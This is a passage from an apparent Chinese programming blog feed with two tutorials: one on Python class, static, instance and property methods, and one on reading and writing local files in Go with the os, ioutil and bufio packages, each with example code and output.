<h4 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h4><p>　　类方法是类对象的方法，在定义时需要在上方使用 <code>@classmethod</code> 进行装饰，形参为 <code>cls</code>。表示类对象，类对象和实例对象都可调用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age, phone)</span>:</span></div><div class="line">        self.name = name</div><div class="line">        self.age = age</div><div class="line">        self._phone = phone</div><div class="line"></div><div class="line"><span class="meta">    @classmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(cls)</span>:</span>  <span class="comment"># 传递参数为cls</span></div><div class="line">        print(<span class="string">"Hello......"</span>)</div><div class="line"></div><div class="line"></div><div class="line">p = Person(<span class="string">"fzy"</span>, <span class="number">24</span>, <span class="string">"13111112222"</span>)</div><div class="line">p.say()  <span class="comment"># 类的实例对象调用</span></div><div class="line">Person.say()  <span class="comment"># 类对象调用</span></div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Hello......</div><div class="line">Hello......</div></pre></td></tr></table></figure>
<h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p>　　静态方法是一个任意函数，在其上方使用 <code>@staticmethod</code> 进行装饰，可以用对象直接调用，静态方法实际上跟该类没有太大关系。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age, phone)</span>:</span></div><div class="line">        self.name = name</div><div class="line">        self.age = age</div><div class="line">        self._phone = phone</div><div class="line"></div><div class="line"><span class="meta">    @staticmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">()</span>:</span>  <span class="comment"># 无需传递参数</span></div><div class="line">        print(<span class="string">"Hello......"</span>)</div><div class="line"></div><div class="line"></div><div class="line">p = Person(<span class="string">"fzy"</span>, <span class="number">24</span>, <span class="string">"13111112222"</span>)</div><div class="line">p.say()  <span class="comment"># 类的实例对象调用</span></div><div class="line">Person.say()  <span class="comment"># 类对象调用</span></div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Hello......</div><div class="line">Hello......</div></pre></td></tr></table></figure>
<p>　　在 Python 3 中，如果方法只通过类调用，而不需要通过实例调用的话，不用非要声明为静态的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">class Person:</div><div class="line">    def __init__(self, name, age, phone):</div><div class="line">        self.name = name</div><div class="line">        self.age = age</div><div class="line">        self._phone = phone</div><div class="line"></div><div class="line">    @staticmethod</div><div class="line">    def say():  # 无需传递参数</div><div class="line">        print(&quot;Hello......&quot;)</div><div class="line"></div><div class="line"></div><div class="line">p = Person(&quot;fzy&quot;, 24, &quot;13111112222&quot;)</div><div class="line">p.say()  # 类的实例对象调用</div><div class="line">Person.say()  # 类对象调用</div></pre></td></tr></table></figure>
<h4 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h4><p>　　类实例方法是类实例化对象的方法，只有实例对象可以调用，形参为 <code>self</code>，指代对象本身。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age, phone)</span>:</span></div><div class="line">        self.name = name</div><div class="line">        self.age = age</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self)</span>:</span>  <span class="comment"># 传递参数self</span></div><div class="line">        print(<span class="string">"My name is "</span>, self.name)</div><div class="line"></div><div class="line"></div><div class="line">p = Person(<span class="string">"fzy"</span>, <span class="number">24</span>, <span class="string">"13111112222"</span>)</div><div class="line">p.say()  <span class="comment"># 类的实例对象调用</span></div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">My name is fzy</div></pre></td></tr></table></figure>
<h4 id="属性方法"><a href="#属性方法" class="headerlink" title="属性方法"></a>属性方法</h4><p>　　通常，在面向对象的编程语言里，会为私有属性设置 <code>getter</code> 和 <code>setter</code> 方法来实现对私有属性的获取和设置功能。如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></div><div class="line">        self._name = name</div><div class="line">        self._age = age</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self._name</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_name</span><span class="params">(self, value)</span>:</span></div><div class="line">        self._name = value</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_age</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self._age</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_age</span><span class="params">(self, value)</span>:</span></div><div class="line">        self._age = value</div><div class="line"></div><div class="line"></div><div class="line">p = Person(<span class="string">"fzy"</span>, <span class="number">24</span>)</div><div class="line">print(p.get_name(), p.get_age())</div><div class="line">p.set_name(<span class="string">"cj"</span>)</div><div class="line">p.set_age(<span class="number">23</span>)</div><div class="line">print(p.get_name(), p.get_age())</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">fzy 24</div><div class="line">cj 23</div></pre></td></tr></table></figure>
<p>　　属性方法的作用就是通过 <code>@property</code> 把一个方法变成一个静态属性。使用 <code>property</code> 取代 <code>getter</code> 和 <code>setter</code> 方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></div><div class="line">        self._name = name</div><div class="line">        self._age = age</div><div class="line"></div><div class="line"><span class="meta">    @property</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self._name</div><div class="line"></div><div class="line"><span class="meta">    @name.setter</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self, value)</span>:</span></div><div class="line">        self._name = value</div><div class="line"></div><div class="line"><span class="meta">    @property</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self._age</div><div class="line"></div><div class="line"><span class="meta">    @age.setter</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(self, value)</span>:</span></div><div class="line">        self._age = value</div><div class="line"></div><div class="line"></div><div class="line">p = Person(<span class="string">"fzy"</span>, <span class="number">24</span>)</div><div class="line">print(p.name, p.age)</div><div class="line">p.name = <span class="string">"cj"</span></div><div class="line">p.age = <span class="number">23</span></div><div class="line">print(p.name, p.age)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">fzy 24</div><div class="line">cj 23</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-文件读写操作</title>
    <url>/2019/06/10/Golang-%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<center>Golang 文件读写操作学习</center>

<a id="more"></a>
<h4 id="使用-os-包"><a href="#使用-os-包" class="headerlink" title="使用 os 包"></a>使用 os 包</h4><h5 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Create</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="params">(file *File, err error)</span></span></div></pre></td></tr></table></figure>
<p>　　<code>Create</code> 采用模式0666（任何人都可读写，不可执行）创建一个名为 name 的文件，如果文件已存在会截断它（为空文件）。如果成功，返回的文件对象可用于 <code>I/O</code> ；对应的文件描述符具有 <code>O_RDWR</code> 模式。如果出错，错误底层类型是 <code>*PathError</code>。</p>
<p>　　示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"os"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line"></div><div class="line">	file, err := os.Create(<span class="string">"xxx.txt"</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">	&#125;</div><div class="line">	fmt.Println(<span class="string">"文件创建成功！"</span>)</div><div class="line">	<span class="keyword">defer</span> file.Close()</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Open</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="params">(file *File, err error)</span></span></div></pre></td></tr></table></figure>
<p>　　<code>Open</code> 打开一个文件<strong>用于读取</strong>。如果操作成功，返回的文件对象的方法可用于读取数据；对应的文件描述符具有 <code>O_RDONLY</code> 模式。如果出错，错误底层类型是 <code>*PathError</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">func OpenFile(name string, flag int, perm FileMode) (file *File, err error)</div></pre></td></tr></table></figure>
<p>　　<code>OpenFile</code> 是一个更一般性的文件打开函数，大多数调用者都应用 <code>Open</code> 或 <code>Create</code> 代替本函数。它会使用指定的选项（如 <code>O_RDONLY</code> 等）、指定的模式（如0666等）打开指定名称的文件。如果操作成功，返回的文件对象可用于 <code>I/O</code> 。如果出错，错误底层类型是 <code>*PathError</code> 。</p>
<p>　　flag 有：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">const</span> (</div><div class="line">    <span class="comment">//只读模式</span></div><div class="line">    O_RDONLY    <span class="keyword">int</span>    = syscall.O_RDONLY    <span class="comment">// open the file read-only.</span></div><div class="line">    <span class="comment">//只写模式</span></div><div class="line">    O_WRONLY    <span class="keyword">int</span>    = syscall.O_WRONLY    <span class="comment">// open the file write-only.</span></div><div class="line">    <span class="comment">//可读可写</span></div><div class="line">    O_RDWR        <span class="keyword">int</span>    = syscall.O_RDWR    <span class="comment">// open the file read-write.</span></div><div class="line">    <span class="comment">//追加内容</span></div><div class="line">    O_APPEND    <span class="keyword">int</span>    = syscall.O_APPEND    <span class="comment">// append data to the file when writing.</span></div><div class="line">    <span class="comment">//创建文件,如果文件不存在</span></div><div class="line">    O_CREATE    <span class="keyword">int</span>    = syscall.O_CREAT    <span class="comment">// create a new file if none exists.</span></div><div class="line">    <span class="comment">//与创建文件一同使用,文件必须存在</span></div><div class="line">    O_EXCL        <span class="keyword">int</span>    = syscall.O_EXCL    <span class="comment">// used with O_CREATE, file must not exist</span></div><div class="line">    <span class="comment">//打开一个同步的文件流</span></div><div class="line">    O_SYNC        <span class="keyword">int</span>    = syscall.O_SYNC    <span class="comment">// open for synchronous I/O.</span></div><div class="line">    <span class="comment">//如果可能,打开时缩短文件</span></div><div class="line">    O_TRUNC        <span class="keyword">int</span>    = syscall.O_TRUNC    <span class="comment">// if possible, truncate file when opened.</span></div><div class="line">)</div></pre></td></tr></table></figure>
<p>　　fileMode 有:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">const</span> (</div><div class="line">    <span class="comment">// 单字符是被String方法用于格式化的属性缩写。</span></div><div class="line">    ModeDir        FileMode = <span class="number">1</span> &lt;&lt; (<span class="number">32</span> - <span class="number">1</span> - <span class="literal">iota</span>) <span class="comment">// d: 目录</span></div><div class="line">    ModeAppend                                     <span class="comment">// a: 只能写入，且只能写入到末尾</span></div><div class="line">    ModeExclusive                                  <span class="comment">// l: 用于执行</span></div><div class="line">    ModeTemporary                                  <span class="comment">// T: 临时文件（非备份文件）</span></div><div class="line">    ModeSymlink                                    <span class="comment">// L: 符号链接（不是快捷方式文件）</span></div><div class="line">    ModeDevice                                     <span class="comment">// D: 设备</span></div><div class="line">    ModeNamedPipe                                  <span class="comment">// p: 命名管道（FIFO）</span></div><div class="line">    ModeSocket                                     <span class="comment">// S: Unix域socket</span></div><div class="line">    ModeSetuid                                     <span class="comment">// u: 表示文件具有其创建者用户id权限</span></div><div class="line">    ModeSetgid                                     <span class="comment">// g: 表示文件具有其创建者组id的权限</span></div><div class="line">    ModeCharDevice                                 <span class="comment">// c: 字符设备，需已设置ModeDevice</span></div><div class="line">    ModeSticky                                     <span class="comment">// t: 只有root/创建者能删除/移动文件</span></div><div class="line">    <span class="comment">// 覆盖所有类型位（用于通过&amp;获取类型位），对普通文件，所有这些位都不应被设置</span></div><div class="line">    ModeType = ModeDir | ModeSymlink | ModeNamedPipe | ModeSocket | ModeDevice</div><div class="line">    ModePerm FileMode = <span class="number">0777</span> <span class="comment">// 覆盖所有Unix权限位（用于通过&amp;获取类型位）</span></div><div class="line">)</div></pre></td></tr></table></figure>
<h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><p>　　常用函数：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *File)</span> <span class="title">Write</span><span class="params">(b []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></div><div class="line"><span class="title">func</span> <span class="params">(f *File)</span> <span class="title">WriteString</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="params">(ret <span class="keyword">int</span>, err error)</span></div><div class="line"><span class="title">func</span> <span class="params">(f *File)</span> <span class="title">WriteAt</span><span class="params">(b []<span class="keyword">byte</span>, off <span class="keyword">int64</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></div></pre></td></tr></table></figure>
<ul>
<li>Write 向文件中写入 len(b) 字节数据。它返回写入的字节数和可能遇到的任何错误。如果返回值 <code>n!=len(b)</code>，本方法会返回一个非 nil 的错误。</li>
<li>WriteString 类似 Write，但接受一个字符串参数。</li>
<li>WriteAt 在指定的位置（相对于文件开始位置）写入 len(b) 字节数据。它返回写入的字节数和可能遇到的任何错误。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"os"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line"></div><div class="line">	file, err := os.OpenFile(<span class="string">"xxx.txt"</span>, os.O_WRONLY, <span class="number">0666</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	s1 := <span class="string">"This is a new file\r\n"</span></div><div class="line">	cnt, err := file.WriteString(s1)</div><div class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"WriteString 写入字节数为："</span>, cnt)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	s2 := <span class="string">"This is a new line\r\n"</span></div><div class="line">	cnt, err = file.Write([]<span class="keyword">byte</span>(s2))</div><div class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"Write 写入字节数为："</span>, cnt)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	s3 := <span class="string">"Write at offset 100\r\n"</span></div><div class="line">	cnt, err =file.WriteAt([]<span class="keyword">byte</span>(s3), <span class="number">100</span>)</div><div class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"WriteAt 写入字节数为："</span>, cnt)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">defer</span> file.Close()</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　上面的方式写入内容会将原文件中的内容覆盖掉，因为使用的是 <code>O_WRONLY</code> 模式，如果要追加内容，我们可以使用追加模式即 <code>O_APPEND</code> ，示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"os"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line"></div><div class="line">	file, err := os.OpenFile(<span class="string">"xxx.txt"</span>, os.O_APPEND, <span class="number">0666</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	s1 := <span class="string">"Append new content\r\n"</span></div><div class="line">	cnt, err := file.WriteString(s1)</div><div class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"WriteString 写入字节数为："</span>, cnt)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><p>　　基本方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *File)</span> <span class="title">Read</span><span class="params">(b []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></div><div class="line"><span class="title">func</span> <span class="params">(f *File)</span> <span class="title">ReadAt</span><span class="params">(b []<span class="keyword">byte</span>, off <span class="keyword">int64</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></div></pre></td></tr></table></figure>
<ul>
<li>Read 方法从 f 中读取最多 <code>len(b)</code> 字节数据并写入 b。它返回读取的字节数和可能遇到的任何错误。文件终止标志是读取 0 个字节且返回值 err 为 io.EOF。 </li>
<li>ReadAt 从指定的位置（相对于文件开始位置）读取 <code>len(b)</code> 字节数据并写入 b。它返回读取的字节数和可能遇到的任何错误。当 <code>n&lt;len(b)</code> 时，本方法总是会返回错误；如果是因为到达文件结尾，返回值 err 会是io.EOF。</li>
</ul>
<p>　　示例：</p>
<ul>
<li>普通读取方式：</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"os"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line"></div><div class="line">	file, err := os.OpenFile(<span class="string">"xxx.txt"</span>, os.O_RDONLY, <span class="number">0666</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">1024</span>)</div><div class="line">	n, err := file.Read(buf)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"读取字节数："</span>, n)</div><div class="line">		fmt.Println(<span class="keyword">string</span>(buf))</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="检查文件是否存在"><a href="#检查文件是否存在" class="headerlink" title="检查文件是否存在"></a>检查文件是否存在</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *File)</span> <span class="title">Stat</span><span class="params">()</span> <span class="params">(fi FileInfo, err error)</span></span></div></pre></td></tr></table></figure>
<p>　　Stat 返回描述文件 f 的 FileInfo 类型值。如果出错，错误底层类型是 *PathError。示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkFileIsExist</span><span class="params">(filename <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> exist = <span class="literal">true</span></div><div class="line">	<span class="keyword">if</span> _, err := os.Stat(filename); os.IsNotExist(err) &#123;</div><div class="line">		exist = <span class="literal">false</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> exist</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="使用-io-ioutil-包"><a href="#使用-io-ioutil-包" class="headerlink" title="使用 io/ioutil 包"></a>使用 io/ioutil 包</h4><p>　　由于 <code>os.Open</code> 是打开一个文件并返回一个文件对象，因此其实可以结合 <code>ioutil.ReadAll(r io.Reader)</code> 来进行读取。 <code>io.Reader</code> 其实是一个包含 <code>Read</code> 方法的接口类型，而文件对象本身是实现了了 <code>Read</code> 方法的。</p>
<h5 id="写文件-1"><a href="#写文件-1" class="headerlink" title="写文件"></a>写文件</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">WriteFile</span><span class="params">(filename <span class="keyword">string</span>, data []<span class="keyword">byte</span>, perm os.FileMode)</span> <span class="title">error</span></span></div></pre></td></tr></table></figure>
<p>　　WriteFile 函数向 filename 指定的文件中写入数据。如果文件不存在将按给出的权限创建文件，否则在写入数据之前清空文件。示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"io/ioutil"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">check</span><span class="params">(e error)</span></span> &#123;</div><div class="line">    <span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</div><div class="line">        <span class="built_in">panic</span>(e)</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line"></div><div class="line">    d1 := []<span class="keyword">byte</span>(<span class="string">"hello\ngo\n"</span>)</div><div class="line">    err := ioutil.WriteFile(<span class="string">"test.txt"</span>, d1, <span class="number">0644</span>)</div><div class="line">    check(err)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="读文件-1"><a href="#读文件-1" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReadFile</span><span class="params">(filename <span class="keyword">string</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span></div></pre></td></tr></table></figure>
<p>　　ReadFile 从 filename 指定的文件中读取数据并返回文件的内容。成功的调用返回的 err 为 nil 而非 EOF。因为本函数定义为读取整个文件，它不会将读取返回的 EOF 视为应报告的错误。示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"io/ioutil"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</div><div class="line">    </div><div class="line">	b, err := ioutil.ReadFile(<span class="string">"xxx.txt"</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	fmt.Println(<span class="keyword">string</span>(b))</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="使用-bufio"><a href="#使用-bufio" class="headerlink" title="使用 bufio"></a>使用 bufio</h4><p>　　bufio 包实现了有缓冲的 I/O。它包装一个 <code>io.Reader</code> 或 <code>io.Writer</code> 接口对象，创建另一个也实现了该接口，且同时还提供了缓冲和一些文本 I/O 的帮助函数的对象。使用带缓冲区的 I/O 可以大幅提高文件读写的效率，因为它把文件读取进缓冲（内存）之后再读取的时候就可以避免文件系统频繁的 I/O 从而提高速度。此外，它还提供了多种读写函数，方便开发者使用。</p>
<ul>
<li>写文件</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// NewWriter创建一个具有默认大小缓冲、写入w的*Writer。</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewWriter</span><span class="params">(w io.Writer)</span> *<span class="title">Writer</span></span></div><div class="line"></div><div class="line"><span class="title">func</span> <span class="params">(b *Writer)</span> <span class="title">Write</span><span class="params">(p []<span class="keyword">byte</span>)</span> <span class="params">(nn <span class="keyword">int</span>, err error)</span></div><div class="line"><span class="title">func</span> <span class="params">(b *Writer)</span> <span class="title">WriteString</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">int</span>, error)</span></div><div class="line"><span class="title">func</span> <span class="params">(b *Writer)</span> <span class="title">WriteByte</span><span class="params">(c <span class="keyword">byte</span>)</span> <span class="title">error</span></div><div class="line">......</div><div class="line"></div><div class="line">// <span class="title">Flush</span>方法将缓冲中的数据写入下层的<span class="title">io</span>.<span class="title">Writer</span>接口。</div><div class="line"><span class="title">func</span> <span class="params">(b *Writer)</span> <span class="title">Flush</span><span class="params">()</span> <span class="title">error</span></div></pre></td></tr></table></figure>
<p>　　示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"bufio"</span></div><div class="line">	<span class="string">"os"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"strconv"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line"></div><div class="line">    file, err := os.OpenFile(<span class="string">"xxx.txt"</span>, os.O_APPEND, <span class="number">0666</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"文件打开错误："</span>, err)</div><div class="line">        <span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">    </div><div class="line">	writer := bufio.NewWriter(file)</div><div class="line">	str := <span class="string">"write new line: "</span></div><div class="line">	<span class="keyword">for</span> i:=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++&#123;</div><div class="line">		_, err := writer.WriteString(str + strconv.Itoa(i) + <span class="string">"\r\n"</span>)</div><div class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">			fmt.Println(<span class="string">"写入错误："</span>, err)</div><div class="line">			<span class="keyword">return</span></div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	writer.Flush()	<span class="comment">// 将缓冲中的数据写入下层的 io.Writer 接口。</span></div><div class="line">	<span class="keyword">defer</span> file.Close()</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>读文件</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Reader)</span> <span class="title">Read</span><span class="params">(p []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span></div><div class="line"><span class="title">func</span> <span class="params">(b *Reader)</span> <span class="title">ReadLine</span><span class="params">()</span> <span class="params">(line []<span class="keyword">byte</span>, isPrefix <span class="keyword">bool</span>, err error)</span></div><div class="line"><span class="title">func</span> <span class="params">(b *Reader)</span> <span class="title">ReadString</span><span class="params">(delim <span class="keyword">byte</span>)</span> <span class="params">(line <span class="keyword">string</span>, err error)</span></div><div class="line">......</div></pre></td></tr></table></figure>
<p>　　示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"os"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"bufio"</span></div><div class="line">	<span class="string">"io"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line"></div><div class="line">	file, err := os.OpenFile(<span class="string">"xxx.txt"</span>, os.O_RDONLY, <span class="number">0666</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	reader := bufio.NewReader(file)</div><div class="line">	<span class="keyword">for</span> &#123;</div><div class="line">		str, err := reader.ReadString(<span class="string">'\n'</span>)	<span class="comment">// 按行读取</span></div><div class="line">		<span class="keyword">if</span> err == io.EOF &#123;</div><div class="line">			<span class="keyword">break</span></div><div class="line">		&#125;</div><div class="line">		fmt.Print(str)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      <categories>
